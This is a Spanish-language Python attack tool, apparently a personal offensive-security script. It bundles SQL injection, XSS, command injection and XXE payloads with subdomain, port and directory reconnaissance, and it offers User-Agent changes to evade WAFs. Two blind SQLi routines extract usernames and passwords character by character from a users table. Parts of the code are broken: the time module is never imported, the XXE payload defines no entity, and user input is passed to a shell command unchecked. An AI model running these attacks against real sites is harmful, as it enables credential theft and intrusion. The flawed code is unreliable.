#!/usr/bin/env python3

import os
import subprocess
import requests
from lxml import html
from urllib.parse import urlparse
from tqdm import tqdm
from string import printable
from time import sleep
import sys
from termcolor import colored

# Definición de colores
class Colores:
    VERDE = "green"
    ROJO = "red"
    AMARILLO = "yellow"
    CYAN = "cyan"
    AZUL = "blue"
    RESET = "reset"

def imprimir_banner():
    """Imprime un banner de bienvenida."""
    banner = r"""
██╗    ██╗███████╗██████╗ ███████╗██╗      ██████╗ ██╗    ██╗
██║    ██║██╔════╝██╔══██╗██╔════╝██║     ██╔═══██╗██║    ██║
██║ █╗ ██║█████╗  ██████╔╝█████╗  ██║     ██║   ██║██║ █╗ ██║
██║███╗██║██╔══╝  ██╔══██╗██╔══╝  ██║     ██║   ██║██║███╗██║
╚███╔███╔╝███████╗██████╔╝██║     ███████╗╚██████╔╝╚███╔███╔╝
 ╚══╝╚══╝ ╚══════╝╚═════╝ ╚═╝     ╚══════╝ ╚═════╝  ╚══╝╚══╝ 
                                                                                                           
                                     by TheOffSecGirl
    """
    print(colored(banner, Colores.VERDE, on_color=None, attrs=["bold"]))

def validar_url(url):
    """Valida que la URL sea correcta."""
    try:
        result = urlparse(url)
        return all([result.scheme, result.netloc])
    except ValueError:
        return False

def verificar_csrf(formulario):
    """Verifica si hay un token CSRF en el formulario."""
    csrf_token = formulario.xpath('//input[@name="csrf_token"]')
    if not csrf_token:
        print(colored("⚠️ Posible vulnerabilidad CSRF en el formulario.", Colores.AMARILLO))
    else:
        print(colored("✅ Token CSRF encontrado.", Colores.VERDE))

def verificar_inyeccion_sql(url, user_agent=None):
    """Verifica inyección SQL enviando payloads comunes."""
    payloads = ["' OR 1=1--", "' OR 'a'='a", "' OR 1=1#", "' AND 1=1--"]
    headers = {'User-Agent': user_agent} if user_agent else {}
    vulnerable = False
    for payload in payloads:
        try:
            response = requests.get(f"{url}{payload}", headers=headers, timeout=10)
            if "SQL" in response.text or "syntax" in response.text:
                print(colored(f"⚠️ Posible vulnerabilidad de inyección SQL con el payload: {payload}", Colores.AMARILLO))
                vulnerable = True
        except requests.RequestException as e:
            print(colored(f"❌ Error al verificar inyección SQL avanzada: {e}", Colores.ROJO))
    if not vulnerable:
        print(colored("✅ No se detectaron inyecciones SQL.", Colores.VERDE))

def verificar_xss(url, user_agent=None):
    """Verifica vulnerabilidades XSS enviando payloads comunes."""
    payload = "<script>alert('XSS')</script>"
    headers = {'User-Agent': user_agent} if user_agent else {}
    try:
        response = requests.get(url, params={"q": payload}, headers=headers, timeout=10)
        if payload in response.text:
            print(colored("⚠️ Posible vulnerabilidad de Cross-Site Scripting (XSS) reflejado.", Colores.AMARILLO))
        else:
            print(colored("✅ No se detectaron vulnerabilidades XSS reflejado.", Colores.VERDE))
    except requests.RequestException as e:
        print(colored(f"❌ Error al verificar XSS avanzado: {e}", Colores.ROJO))

def verificar_inyeccion_comando(url, user_agent=None):
    """Verifica inyección de comandos enviando payloads comunes."""
    payloads = ["; ls", "; cat /etc/passwd"]
    headers = {'User-Agent': user_agent} if user_agent else {}
    vulnerable = False
    for payload in payloads:
        try:
            response = requests.get(f"{url}{payload}", headers=headers, timeout=10)
            if "root:" in response.text:
                print(colored(f"⚠️ Posible vulnerabilidad de inyección de comandos con el payload: {payload}", Colores.AMARILLO))
                vulnerable = True
        except requests.RequestException as e:
            print(colored(f"❌ Error al verificar inyección de comandos: {e}", Colores.ROJO))
    if not vulnerable:
        print(colored("✅ No se detectaron inyecciones de comandos.", Colores.VERDE))

def verificar_encabezados_http(url, user_agent=None):
    """Verifica la seguridad de los encabezados HTTP."""
    headers = {'User-Agent': user_agent} if user_agent else {}
    try:
        response = requests.get(url, headers=headers, timeout=10)
        response.raise_for_status()  # Lanza un error si la solicitud no fue exitosa
        if "X-Content-Type-Options" not in response.headers:
            print(colored("⚠️ Falta encabezado X-Content-Type-Options", Colores.AMARILLO))
        if "X-XSS-Protection" not in response.headers:
            print(colored("⚠️ Falta encabezado X-XSS-Protection", Colores.AMARILLO))
        if "X-Frame-Options" not in response.headers:
            print(colored("⚠️ Falta encabezado X-Frame-Options", Colores.AMARILLO))
        if "Strict-Transport-Security" not in response.headers:
            print(colored("⚠️ Falta encabezado Strict-Transport-Security", Colores.AMARILLO))
        if "Content-Security-Policy" not in response.headers:
            print(colored("⚠️ Falta encabezado Content-Security-Policy", Colores.AMARILLO))
        print(colored("✅ Encabezados HTTP revisados.", Colores.VERDE))
    except requests.RequestException as e:
        print(colored(f"❌ Error al verificar encabezados HTTP: {e}", Colores.ROJO))

def verificar_xxe_ob(url, user_agent=None):
    """Verifica vulnerabilidades XXE OB enviando payloads comunes."""
    payloads = ["<xml><foo><bar><baz><cdata><![CDATA[<x><xxe>&xxe;</xxe></x>]]></cdata></baz></bar></foo></xml>"]
    headers = {'User-Agent': user_agent} if user_agent else {}
    vulnerable = False
    for payload in payloads:
        try:
            response = requests.post(url, data=payload, headers=headers, timeout=10)
            if "xxe" in response.text:
                print(colored(f"⚠️ Posible vulnerabilidad de XXE OB con el payload: {payload}", Colores.AMARILLO))
                vulnerable = True
        except requests.RequestException as e:
            print(colored(f"❌ Error al verificar XXE OB: {e}", Colores.ROJO))
    if not vulnerable:
        print(colored("✅ No se detectaron vulnerabilidades XXE OB.", Colores.VERDE))

def automatizar_xxe_ob(url, user_agent=None):
    """Automatiza la explotación de XXE OB."""
    print(colored("Automatizando la explotación de XXE OB...", Colores.AZUL))
    verificar_xxe_ob(url, user_agent)

def escanear_vulnerabilidades(url, opciones, user_agent=None):
    """Escanea la URL en busca de las vulnerabilidades seleccionadas."""
    if not validar_url(url):
        print(colored("❌ URL inválida. Por favor, ingrese una URL válida.", Colores.ROJO))
        return

    try:
        headers = {'User-Agent': user_agent} if user_agent else {}
        response = requests.get(url, headers=headers, timeout=10)
        response.raise_for_status()  # Lanza un error si la solicitud no fue exitosa
        root = html.fromstring(response.content)

        # Verificar vulnerabilidades según las opciones seleccionadas
        formularios = root.xpath('//form')
        for formulario in formularios:
            if 'csrf' in opciones:
                verificar_csrf(formulario)
        if 'sql' in opciones:
            verificar_inyeccion_sql(url, user_agent)
        if 'xss' in opciones:
            verificar_xss(url, user_agent)
        if 'comando' in opciones:
            verificar_inyeccion_comando(url, user_agent)
        if 'encabezados' in opciones:
            verificar_encabezados_http(url, user_agent)
        if 'xxe_ob' in opciones:
            verificar_xxe_ob(url, user_agent)

    except requests.RequestException as e:
        print(colored(f"❌ Error al escanear la URL: {e}", Colores.ROJO))

def main_url_input():
    return input(colored("Ingrese la URL principal para realizar el ataque: ", Colores.AZUL))

def user_agent_input():
    return input(colored("Ingrese el User-Agent a utilizar (deje vacío para usar el predeterminado): ", Colores.AZUL))

def configure_headers(user_agent):
    return {"User-Agent": user_agent if user_agent else "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"}

def makeSQLI(main_url, headers):
    p1 = Progress("Fuerza bruta")
    p1.status("Iniciando proceso de fuerza bruta...")

    extracted_info = ""
    for position in tqdm(range(1, 150), desc="Fuerza bruta"):
        for character in range(33, 126):
            sqli_url = f"{main_url}?id=0 or (select(select ascii(substring(select group_concat(username,0x3a,password) from users), {position},1)) from users where id = 1)={character}"
            p1.status(colored(f"[+] {sqli_url} iniciado...", Colores.VERDE))
            
            try:
                r = requests.get(sqli_url, headers=headers)
            except requests.RequestException as e:
                print(colored(f"[!] Error en la solicitud: {e}", Colores.ROJO))
                sys.exit(1)
            
            if r.status_code == 200:  
                extracted_info += chr(character)
                p1.status(colored(f"[*] {extracted_info}", Colores.AZUL))
                break

def makeTimeBasedSQLI(main_url, headers):
    p1 = Progress("Fuerza bruta")
    p1.status("Iniciando proceso de fuerza bruta...")

    extracted_info = ""
    for position in tqdm(range(1, 150), desc="Fuerza bruta"):
        for character in range(33, 126):
            sqli_url = f"{main_url}?id=1 and if(ascii(substr((select group_concat(username,0x3a,password) from users), {position},1))={character}, sleep(0.35), 1)"
            p1.status(colored(f"[+] {sqli_url} iniciado...", Colores.VERDE))

            time_start = time.time()

            try:
                r = requests.get(sqli_url, headers=headers)
            except requests.RequestException as e:
                print(colored(f"[!] Error en la solicitud: {e}", Colores.ROJO))
                sys.exit(1)

            time_end = time.time()

            if time_end - time_start > 0.35:  
                extracted_info += chr(character)
                p1.status(colored(f"[*] {extracted_info}", Colores.AZUL))
                break

class Progress:
    def __init__(self, task_name):
        self.task_name = task_name
        print(colored(f"[+] {self.task_name} iniciado...", Colores.VERDE))
        print(colored(f"[+] {self.task_name} iniciado...", Colores.AZUL))

    def status(self, message):
        print(colored(f"[*] {self.task_name}: {message}", Colores.CYAN))

def sql_injection_menu(main_url, headers):
    print(colored("\nSeleccione el tipo de SQLi:", Colores.AZUL))
    print(colored("1. Conditional SQLi", Colores.CYAN))
    print(colored("2. Time-Based SQLi", Colores.CYAN))
    choice = input(colored("Ingrese su elección (1 o 2): ", Colores.AZUL)).strip()

    if choice == "1":
        makeSQLI(main_url, headers)
    elif choice == "2":
        makeTimeBasedSQLI(main_url, headers)
    else:
        print(colored("[!] Opción no válida.", Colores.ROJO))

def reconocimiento_dominio(dominio, user_agent=None):
    print(colored(f"[*] Iniciando reconocimiento de subdominios para {dominio}", Colores.AZUL))
    subfinder_cmd = f"subfinder -d {dominio} -silent -o subdomains.txt"
    httpx_cmd = f"httpx -l subdomains.txt -silent -o active_subdomains.txt"

    if user_agent:
        subfinder_cmd += f" --header 'User-Agent: {user_agent}'"
        httpx_cmd += f" --header 'User-Agent: {user_agent}'"

    try:
        subprocess.run(subfinder_cmd, shell=True, check=True)
        print(colored("[+] Subfinder completado. Subdominios guardados en subdomains.txt", Colores.VERDE))
        subprocess.run(httpx_cmd, shell=True, check=True)
        print(colored("[+] HTTPX completado. Subdominios activos guardados en active_subdomains.txt", Colores.VERDE))
    except subprocess.CalledProcessError as e:
        print(colored(f"❌ Error en el reconocimiento de subdominios: {e}", Colores.ROJO))

def escaneo_puertos():
    print(colored("[*] Iniciando escaneo de puertos en subdominios activos", Colores.AZUL))

    # Verificar si el archivo contiene subdominios
    if os.path.isfile("active_subdomains.txt") and os.path.getsize("active_subdomains.txt") > 0:
        nmap_cmd = "nmap -iL active_subdomains.txt -T4 -F -oN nmap_scan.txt"
        try:
            subprocess.run(nmap_cmd, shell=True, check=True)
            print(colored("[+] Escaneo de puertos completado. Resultados guardados en nmap_scan.txt", Colores.VERDE))
        except subprocess.CalledProcessError as e:
            print(colored(f"❌ Error en el escaneo de puertos: {e}", Colores.ROJO))
    else:
        print(colored("❌ No se encontraron subdominios activos para escanear.", Colores.ROJO))

def enumerar_directorios(url, wordlist_path, user_agent=None):
    """Enumera directorios utilizando una lista de palabras (wordlist)."""
    headers = {'User-Agent': user_agent} if user_agent else {}
    with open(wordlist_path, 'r') as wordlist:
        for word in wordlist:
            word = word.strip()
            full_url = f"{url}/{word}"
            try:
                response = requests.get(full_url, headers=headers, timeout=10)
                if response.status_code == 200:
                    print(colored(f"✅ Directorio encontrado: {full_url}", Colores.AMARILLO))
                elif response.status_code == 404:
                    print(colored(f"✅ Directorio no encontrado: {full_url}", Colores.VERDE))
            except requests.RequestException as e:
                print(colored(f"❌ Error al verificar directorio: {full_url} - {e}", Colores.ROJO))

if __name__ == "__main__":
    imprimir_banner()  # Imprime el banner al inicio

    try:
        while True:
            print(colored("\nSeleccione la tarea que desea realizar:", Colores.AZUL))
            print(colored("1. Análisis de vulnerabilidades en URL", Colores.CYAN))
            print(colored("2. Reconocimiento de subdominios", Colores.CYAN))
            print(colored("3. Escaneo de puertos", Colores.CYAN))
            print(colored("4. SQL Injection", Colores.CYAN))
            print(colored("5. Enumerar directorios", Colores.CYAN))
            print(colored("6. XXE OB Automatizado", Colores.CYAN))
            print(colored("7. Todas las anteriores", Colores.CYAN))
            print(colored("8. Salir", Colores.CYAN))

            tarea = input(colored("Ingrese el número de la opción: ", Colores.AZUL))

            if tarea in ['1', '2', '3', '4', '5', '6', '7']:
                usar_agente = input(colored("¿Deseas añadir un User-Agent personalizado para evitar bloqueos del WAF? (y/n): ", Colores.AZUL))
                user_agent = None
                if usar_agente.lower() == 'y':
                    user_agent = input(colored("Introduce el User-Agent que deseas usar: ", Colores.AZUL))

            if tarea == '1':
                url_a_escanear = input(colored("Ingrese la URL a escanear: ", Colores.AZUL))
                print(colored("Seleccione las vulnerabilidades a comprobar:", Colores.AZUL))
                print(colored("1. CSRF", Colores.CYAN))
                print(colored("2. Inyección SQL", Colores.CYAN))
                print(colored("3. XSS", Colores.CYAN))
                print(colored("4. Inyección de Comandos", Colores.CYAN))
                print(colored("5. Encabezados HTTP", Colores.CYAN))
                print(colored("6. XXE OB", Colores.CYAN))
                print(colored("7. Todas", Colores.CYAN))

                seleccion = input(colored("Ingrese el número de la opción: ", Colores.AZUL))

                opciones_seleccionadas = []
                if seleccion == '1':
                    opciones_seleccionadas.append('csrf')
                elif seleccion == '2':
                    opciones_seleccionadas.append('sql')
                elif seleccion == '3':
                    opciones_seleccionadas.append('xss')
                elif seleccion == '4':
                    opciones_seleccionadas.append('comando')
                elif seleccion == '5':
                    opciones_seleccionadas.append('encabezados')
                elif seleccion == '6':
                    opciones_seleccionadas.append('xxe_ob')
                elif seleccion == '7':
                    opciones_seleccionadas = ['csrf', 'sql', 'xss', 'comando', 'encabezados', 'xxe_ob']
                else:
                    print(colored("[!] Opción no válida.", Colores.ROJO))
                    continue

                escanear_vulnerabilidades(url_a_escanear, opciones_seleccionadas, user_agent)

            elif tarea == '2':
                dominio = input(colored("Ingrese el dominio para el reconocimiento: ", Colores.AZUL))
                reconocimiento_dominio(dominio, user_agent)

            elif tarea == '3':
                escaneo_puertos()

            elif tarea == '4':
                main_url = main_url_input()
                headers = configure_headers(user_agent)
                sql_injection_menu(main_url, headers)

            elif tarea == '5':
                url = input(colored("Ingrese la URL base para enumerar directorios: ", Colores.AZUL))
                wordlist_path = input(colored("Ingrese la ruta de la wordlist: ", Colores.AZUL))
                enumerar_directorios(url, wordlist_path, user_agent)

            elif tarea == '6':
                url = input(colored("Ingrese la URL para automatizar XXE OB: ", Colores.AZUL))
                automatizar_xxe_ob(url, user_agent)

            elif tarea == '7':
                dominio = input(colored("Ingrese el dominio para el reconocimiento y escaneo: ", Colores.AZUL))
                reconocimiento_dominio(dominio, user_agent)
                escaneo_puertos()

            elif tarea == '8':
                print(colored("\n[✓] ¡Hasta luego!", Colores.VERDE))
                break

            else:
                print(colored("[!] Opción no válida.", Colores.ROJO))

    except KeyboardInterrupt:
        print(colored("\n[✓] ¡Hasta luego!", Colores.VERDE))
